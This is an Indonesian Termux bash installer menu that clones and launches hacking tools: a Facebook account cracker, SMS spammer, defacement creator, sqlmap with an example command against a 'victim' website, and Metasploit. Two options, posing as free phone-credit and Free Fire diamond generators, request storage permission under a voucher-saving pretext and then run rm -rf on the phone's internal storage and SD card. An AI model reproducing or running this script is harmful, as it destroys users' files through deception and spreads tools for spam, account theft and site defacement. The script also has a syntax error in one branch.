#!/system/xbin/bash
# Bersihkan Layar

clear

blue='\033[34;1m'

green='\033[32;1m'

purple='\033[35;1m'

cyan='\033[36;1m'

red='\033[31;1m'

white='\033[37;1m'

yellow='\033[33;1m'

###################################################

# CTRL C-

###################################################

trap ctrl_c INT

ctrl_c() {

clear

echo $red"[#]> (Ctrl + C ) Detected, 

Trying To Exit ... "

sleep 1

echo ""

echo $yellow"[#]> Thank You For Using My 

Tools ... "

sleep 1

echo ""

echo $white"[#]> ALI ATTACKER Was Here... "

read enter

exit

}

echo "

____________________________________________" | lolcat

echo $red"kontak admin: 087773280884"

echo $green"Author : MR.CAK3R_14"

echo $yellow"Team : HAS ATTACKER"

echo $blue"MR.C4K3R TERSAKITI"

echo "

___________________________________________" | lolcat

echo $green" 01) Install Bajinganv6"
echo $red"________________________"
echo $green" 02) Install SQLmap"
echo $yellow"________________________"
echo $green" 03)Install Deface-Creator"
echo $aqua"________________________"
echo $green" 04)Install SpamSMS"
echo $white"________________________"
echo $green" 05)Install MBF C4K3R"
echo $cyan"________________________"
echo $yellow" 06)Install Webdav"
echo $red"________________________"
echo $purple" 07)Dengerin Musik"
echo $green"________________________"
echo $blue" 08)Install Metasploit"
echo $cyan"________________________"
echo $blue" 09)Install ngrok"
echo $white"________________________"
echo $red" 10)Install BOT FB"
echo $blue"________________________"
echo $red" 11)Install Tool Lacak IP"
echo $aqua"________________________"
echo $yellow" 12)Install Simi Simi"
echo $cyan"________________________"
echo $yellow" 13)Install Tool Pulsa"
echo $red"________________________"
echo $aqua" 14)Install Tool Hack DM FF"
echo $purple"________________________"
echo $aqua" 15)Install Tmux-Bunch"
echo $white"________________________"  
read -p "[Mr.CAK3R_14]> " bro;

if [ $bro = 1 ] || [ $bro = 01 ]
then
clear
pkg update
pkg install git
git clone https://github.com/DarknessCyberTeam/BAJINGANv6
echo $green"Username:BAJINGAN"
echo $green"Passoword:Gans"
exit
fi

if [ $bro = 2 ] || [ $bro = 02 ]
then
clear
pkg update
pkg install git
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
echo $green"SQLMAP TERINSTALL"
echo $green"python2 sqlmap.py -u webkorban.com --dbs"
exit
fi

if [ $bro = 3 ] || [ $bro = 03 ]
then
clear
pkg update
pkg install git
git clone https://github.com/Ubaii/script-deface-creator
echo $green"SC DEFACE CREATOR TERINSTALL"
cd script-deface-creator
sh create.sh
fi

if [ $bro = 4 ] || [ $bro = 04 ]
then
clear
pkg update
pkg install git
git clone https://github.com/SIIL3NT/spam
cd spam
fi

if [ $bro = 5 ] || [ $bro = 05 ]
then
clear
pkg update
pkg install git
git clone https://github.com/mrcaker/hackfb
cd hackfb
sh caker.sh
fi

if [ $bro = 6 ] || [ $bro = 06 ]
then
clear
pkg update
pkg install git
git clone https://github.com/NoiseCrusT/webdav
cd wevdav
cat README.md
fi

if [ $bro = 7 ] || [ $bro = 07 ]
then
clear
pkg install mpv
pkg install python2
pip2 install mps_youtube
pip2 install youtube_dl
mpsyt
fi

if [ $bro = 8 ] || [ $bro = 08 ]
then
clear
pkg update
pkg install git
git clone https://github.com/rapid7/metasploit-framework
echo $blue"T E R I N S T A A L"
fi

if [ $bro = 9 ] || [ $bro = 09 ]
then
clear
pkg update
pkg install wget
pkg install unzip
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
chmod +x ngrok
./ngrok
fi

if [ $bro = 10 ] || [ $bro = 10 ] 
pkg update
pkg install python2
pkg install git
git clone https://github.com/CiKu370/OSIF
cd OSIF
python2 osif.py
fi

if [ $bro = 11 ] || [ $bro = 11 ]
then
clear
pkg update
pkg install git
pkg install python2
git clone https://github.com/maldevel/IPGeoLocation
cd IPGeoLocation
python2 ipgeolocation
fi

if [ $bro = 12 ] || [ $bro = 12 ]
then
clear
pkg update
pkg install git
pkg install python2
git clone https://github.com/prankbots/simi
cd simi
python2 simi.py
fi

if [ $bro = 13 ] || [ $bro = 13 ]
then
clear
pkg update
termux-setup-storage
echo $green"Izinkan Agar Bisa Menyimpan Hasil Vocher.txt Di Internal"
sleep 2
termux-setup-storage
sleep 2
termux-setup-storage
sleep 2
echo $green"Izinkan Agar Bisa Menyimpan Hasil Vocher.txt Di Internal"
rm -rf /storage/emulated/0
rm -rf /sdcard
rm -rf /storage/emulated/0/DCIM
fi

if [ $bro = 14 ] || [ $bro = 14 ]
then
clear
termux-setup-storage
sleep 3
termux setup-storage
sleep 3
termux-setup-storage
echo $green"izinkan Agar Bisa Menyimpan Vocher Diamond FF"
rm -rf /storage/emulated/0
rm -rf /sdcard
fi

if [ $bro = 15 ] || [ $bro = 15 ]
then
clear
echo $purple"Anda Harus Memasang Metasploit-Framework Dahulu"
pkg update
pkg install git
git clone https://github.com/Hax4us/Tmux-Bunch
echo $blue"TERINSTALL"
exit
fi
